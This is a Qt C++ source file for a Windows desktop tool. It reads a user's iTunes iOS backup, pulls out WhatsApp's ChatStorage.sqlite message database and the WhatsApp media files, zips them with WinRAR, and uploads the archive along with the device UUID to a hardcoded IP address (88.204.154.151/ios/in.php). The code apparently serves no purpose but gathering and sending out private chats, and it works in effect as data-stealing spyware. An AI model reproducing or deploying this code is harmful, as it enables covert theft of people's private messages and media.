#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "QDir"
#include "QDebug"

#define TEST

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);

   setBackUpRootPath();
   showAllBackups();
  // on_startBtn_clicked();

    //runTest();

}

MainWindow::~MainWindow()
{
    delete ui;
}


void MainWindow::showAllBackups(){

    QDir backupDir(pathToAllBackup);
    QStringList list =  backupDir.entryList();

    foreach(QString dirName,list){
        if(dirName == "." || dirName == ".."){
            list.removeOne(dirName);
            continue;
        }
        qDebug() << "dirName:" << dirName;
    }

   ui->backupsListComBox->addItems(list);


}

void MainWindow::setBackUpRootPath(){

    pathToAllBackup = QString("%1/AppData/Roaming/Apple Computer/MobileSync/Backup").arg(QDir::homePath());

}

void MainWindow::runTest(){



}

void MainWindow::on_startBtn_clicked()
{
    ui->progressBar->setRange(0,0);

    QString manifestPath = QString("%1/%2/%3").arg(pathToAllBackup,ui->backupsListComBox->currentText(), "Manifest.db" );

    UUID = ui->backupsListComBox->currentText();
    //start time
    qint64 startTime =  QDateTime::currentMSecsSinceEpoch();
    parseDb(manifestPath);
    qint64 endTime =  QDateTime::currentMSecsSinceEpoch();

    qDebug() << "Parsing time is:" << (endTime - startTime ) << "millisecond";
    //end time

    ui->progressBar->setRange(0,100);
    ui->progressBar->setValue(100);

}

bool MainWindow::parseDb(QString backupFullPath){

    qDebug() << "backupFullPath:" << backupFullPath;
    connectDatabase(backupFullPath);

    //move ChatStorage.sqlite path
    copyStorageFile();

    // move media files
    QMap <QString, QString> *mapIosPathAndLocalPath =new QMap<QString, QString>();
    getMediaFilesPaths(mapIosPathAndLocalPath);
    copyFilesToTmpDir(mapIosPathAndLocalPath);

    //zip file
    QString zippedPath = zip();
    if(zippedPath.isEmpty()){
        qDebug() << "faild zip file";
        return false;
    }

     //send ziped file to server
    sendZip(zippedPath, UUID);

}

bool MainWindow::connectDatabase(const QString& database)
{

     db =  QSqlDatabase::addDatabase("QSQLITE");
     db.setDatabaseName(database);

    bool  res = db.open();
     if (!res){
         qDebug() << "database not opened";
         return false;
     }
     else{
         qDebug() << "database sucsses opened";
        // db.close();

     }
     return true;
}


bool MainWindow::copyStorageFile(){

    QSqlQuery query(db);
    QString cmd = "select * from files where relativePath = 'ChatStorage.sqlite'";

    bool success = query.exec(cmd);
    if (!success){
         qDebug() << "faild select";
         return false;
    }

    if(query.next())
    {
         QString hash = query.value(0).toString();
         QString iosFileName = query.value(2).toString();
         currentBackup = QString("%1/%2").arg(pathToAllBackup,ui->backupsListComBox->currentText() );
         QDirIterator dirIter(currentBackup, QStringList() << hash, QDir::Files, QDirIterator::Subdirectories);
         if(dirIter.hasNext()){
             QString localPath = dirIter.next();
             //copy
             QString tempDirPath = getTmpDirFullPath();
             if(tempDirPath.isEmpty()){
                 qDebug() << "faild create tmpDir";
                 return false;
             }
             QString srcFilePAth = localPath;
             QString dstFilePath = QString("%1/%2").arg(tempDirPath,iosFileName );
             QFile file;
             bool isCopiedSuccess =  file.copy(srcFilePAth, dstFilePath);

            if(!isCopiedSuccess){
                qDebug() << "faild copy file from src path: " << srcFilePAth << " toPath: " << dstFilePath;
                return false;
            }
         }
    }


    return true;
}


bool MainWindow::getMediaFilesPaths( QMap <QString, QString>* mapIosPathAndLocalPath){
    //1 Get media files paths
    QSqlQuery query(db);
    QString cmd = "select * from files where domain LIKE \"%AppDomain-net.whatsapp.WhatsApp%\" AND relativePath LIKE \"%Library/Media%\" AND flags = 1";

    bool success = query.exec(cmd);
    if (!success){
         qDebug() << "faild select";
         return false;
    }

    QMap <QString, QString> mapHashPath;

    int countRowInDb = 0;
    while(query.next())
    {
        QString hash = query.value(0).toString();
        QString pathInIOS = query.value(2).toString();
        mapHashPath.insert(hash,pathInIOS);
        countRowInDb++;
    }


    currentBackup = QString("%1/%2").arg(pathToAllBackup,ui->backupsListComBox->currentText() );
    QMapIterator<QString, QString> iter(mapHashPath);
    qint64 countFind = 0;
    while (iter.hasNext()) {
        iter.next();
        qDebug() << iter.key() << ": " << iter.value() << endl;
        QDirIterator dirIter(currentBackup, QStringList() << iter.key(), QDir::Files, QDirIterator::Subdirectories);
        while(dirIter.hasNext()){
            mapIosPathAndLocalPath->insert(iter.value(),dirIter.next() );
        }

        qDebug() << "count of find loop:" << countFind;
        qDebug() << "current size of finded map is:" << mapIosPathAndLocalPath->count();
        countFind++;

        //for test
#ifdef TEST
        if(countFind > 5){
            break;
        }
#endif
    }

    qDebug() << "Finished Count of finded files is:" << mapIosPathAndLocalPath->count();
    return true;
}

bool MainWindow::copyFilesToTmpDir (QMap <QString, QString>* mapIosPathAndLocalPath){

    // get tmp dir

    QString tempDirPath = getTmpDirFullPath();
    if(tempDirPath.isEmpty()){
        qDebug() << "faild create tmpDir";
        return false;
    }

    QMapIterator<QString, QString> iter(*mapIosPathAndLocalPath);

    while (iter.hasNext()) {

        iter.next();
        //Library/Media/77017213945-1409280046@g.us/2/2/220f0a3e-a074-4ade-b2f2-2631be0f5a11.thumb
        QString iosPath  = iter.key();

        //"C:/Users/Admin/AppData/Roaming/Apple Computer/MobileSync/Backup/1b5b94b83e762264209e8482ff965434f0dcd1ab/00/0095d94891ca2b7c2754fe234854b2e34807b57a"
        QString localPath = iter.value();

        qDebug() << iosPath << ":" << localPath;

        //cut from iosPath Library/
        QString fileName = QFileInfo(iosPath).fileName();
        iosPath = iosPath.remove(0,8);
        iosPath = iosPath.replace(fileName, "");

        QString pathWithAllDirs = QString("%1/%2").arg(tempDirPath,iosPath );

        QDir dirForMedia(pathWithAllDirs);

        if(!dirForMedia.exists()){
            bool succes = dirForMedia.mkpath(pathWithAllDirs);
            if(!succes){
                qDebug() << "faild to create folder with path:" << pathWithAllDirs;
            }

        }

        //copy
        QString srcFilePAth = localPath;
        QString dstFilePath = QString("%1/%2").arg(pathWithAllDirs,fileName );

        QFile file;

       bool isCopiedSuccess =  file.copy(srcFilePAth, dstFilePath);

       if(!isCopiedSuccess){
           qDebug() << "faild copy file from src path: " << srcFilePAth << " toPath: " << dstFilePath;
       }

    }

    return true;

}

QString MainWindow::zip(){

    //"%ProgamFiles%\WinRAR\Rar.exe" a -ep1 -r "Name of ZIP file with path" "%UserProfile%\Desktop\someFolder"
   // rar a backup @backup.lst



    QProcess* zipProc = new QProcess(this);
    QString cmd = getWinRarExePath();
    if (cmd.isEmpty()){
        qDebug() << "faild get rar.exe path";
        return "";
    }

    QString zippedFileName = QString("%1/%2.zip").arg(getTmpDirFullPath(),UUID);

    QStringList argZip;
    //argZip << "a" << "-ep1" << "-r" << zippedFileName << getTmpDirFullPath();
     argZip << "a" << "-ep1" << zippedFileName << QString("@%1").arg(getListFilePathFileForZip());
    zipProc->start(cmd, argZip);

    if (!zipProc->waitForFinished())
        return "";

    QByteArray zipResult = zipProc->readAll();

    qDebug() << "zip result:" << zipResult;

    return zippedFileName;

}

QString MainWindow::getListFilePathFileForZip(){

    QString listFilePath =  QString("%1/%2.lst").arg(QDir::tempPath(),UUID);
    QFile fileLst(listFilePath);
    if (!fileLst.open(QIODevice::WriteOnly)){
        return "";
    }
    QTextStream out(&fileLst);
       // out << "The magic number is: " << 49 << "\n";


    QDir backupDir(getTmpDirFullPath());
    QStringList list =  backupDir.entryList();

    foreach(QString dirName,list){
        if(dirName == "." || dirName == ".."){
            continue;
        }

        //write to lst file
        QString fullPath = QString("%1/%2").arg(getTmpDirFullPath(), dirName);
        out << fullPath << "\n";

    }

    fileLst.close();
    return listFilePath;




}

bool MainWindow::clear(){

    QString lstFile = QString("%1/%1.lst").arg(QDir::tempPath(), UUID);
    QFile::remove(lstFile);




}

QString  MainWindow::getWinRarExePath(){

    QString winrarExe = "C:\\Program Files\\WinRAR\\Rar.exe";


    QFile file(winrarExe);

    if(file.exists()){

        return winrarExe;
    }
    else{
        return "";
    }

}

QString MainWindow::getTmpDirFullPath (){

    QString tempDirPath = QString("%1/%2").arg(QDir::tempPath(), UUID);
    QDir tmpDir(tempDirPath);

    if(!tmpDir.exists()){
        bool isSuccess = tmpDir.mkdir(tempDirPath);
        if(!isSuccess){
            qDebug() << "faild create temp folder at path" << tempDirPath;
           return "";
        }

    }

    return tempDirPath;

}

QString MainWindow::getNameFromFullPath(QString fullPath){

    QFile file(fullPath);
    QString str = file.fileName();
    QStringList parts = str.split("/");
    QString lastSection = parts.at(parts.size()-1);
    return lastSection;

}

bool MainWindow::sendZip (QString zipFullPath, QString uuid){

    QString fileName = getNameFromFullPath(zipFullPath);

    QFile file(zipFullPath);
    if (!file.open(QIODevice::ReadWrite))
        return false;

    QNetworkAccessManager *manager =  new QNetworkAccessManager(this);;
    //параметр 1 - какое-то поле, параметр 2 - файл
    QByteArray param1Name="uuid" ,param1Value=uuid.toUtf8();
    QByteArray param2Name="wzipfile", param2FileName=fileName.toUtf8();
    QByteArray  param2ContentType="application/octet-stream";
    QByteArray param2Data=file.readAll();

    //задаем разделитель
    QByteArray postData,boundary="1BEF0A57BE110FD467A";
    //первый параметр
    postData.append("--"+boundary+"\r\n");//разделитель
    //имя параметра
    postData.append("Content-Disposition: form-data; name=\"");
    postData.append(param1Name);
    postData.append("\"\r\n\r\n");
    //значение параметра
    postData.append(param1Value);
    postData.append("\r\n");

    //параметр 2 - файл
    postData.append("--"+boundary+"\r\n");//разделитель
    //имя параметра
    postData.append("Content-Disposition: form-data; name=\"");
    postData.append(param2Name);
    //имя файла
    postData.append("\"; filename=\"");
    postData.append(param2FileName);
    postData.append("\"\r\n");
    //тип содержимого файла
    postData.append("Content-Type: "+param2ContentType+"\r\n");
    //передаем в base64
    postData.append("Content-Transfer-Encoding: base64\r\n\r\n");
    //данные
    postData.append(param2Data.toBase64());
    postData.append("\r\n");
    //"хвост" запроса
    postData.append("--"+boundary+"--\r\n");

    QNetworkRequest request(QUrl("http://88.204.154.151/ios/in.php"));
    request.setHeader(QNetworkRequest::ContentTypeHeader,
        "multipart/form-data; boundary="+boundary);
    request.setHeader(QNetworkRequest::ContentLengthHeader,
        QByteArray::number(postData.length()));

    connect(manager, SIGNAL(finished(QNetworkReply*)),this, SLOT(sendReportToServerReply(QNetworkReply*)));

    QNetworkReply *reply=manager->post(request,postData);






    return true;
}

 void MainWindow::sendReportToServerReply(QNetworkReply* reply){


     qDebug() << "got replay from server:";

 }

/*
bool MainWindow::sendZip (QString zipFullPath, QString uuid){

    QByteArray data;
    QFile file(zipFullPath);
    if (!file.open(QIODevice::ReadWrite))
        return false;

    QString boundary;
    QByteArray dataToSend; // byte array to be sent in POST

    boundary="-----------------------------7d935033608e2";

    QString body = "\r\n--" + boundary + "\r\n";
    QString contentDisposition = QString("Content-Disposition: form-data; name=\"upfile\"; filename=%1\r\n").arg(getNameFromFullPath(zipFullPath));
    //body += "Content-Disposition: form-data; name=\"upfile\"; filename=\"database.sqlite\"\r\n";
    body += contentDisposition;
    body += "Content-Type: application/octet-stream\r\n\r\n";
    body += file.readAll();
    body += "\r\n--" + boundary + "--\r\n";
    dataToSend = body.toUtf8();

    QNetworkAccessManager *networkAccessManager = new QNetworkAccessManager(this);
    QNetworkRequest request(QUrl("http://www.mydomain.com/upload.aspx"));
    request.setRawHeader("Content-Type","multipart/form-data; boundary=-----------------------------7d935033608e2");
    request.setHeader(QNetworkRequest::ContentLengthHeader,dataToSend.size());
    connect(networkAccessManager, SIGNAL(finished(QNetworkReply*)),this, SLOT(sendReportToServerReply(QNetworkReply*)));
    QNetworkReply *reply = networkAccessManager->post(request,dataToSend); // perform POST request

    return true;

}
*/
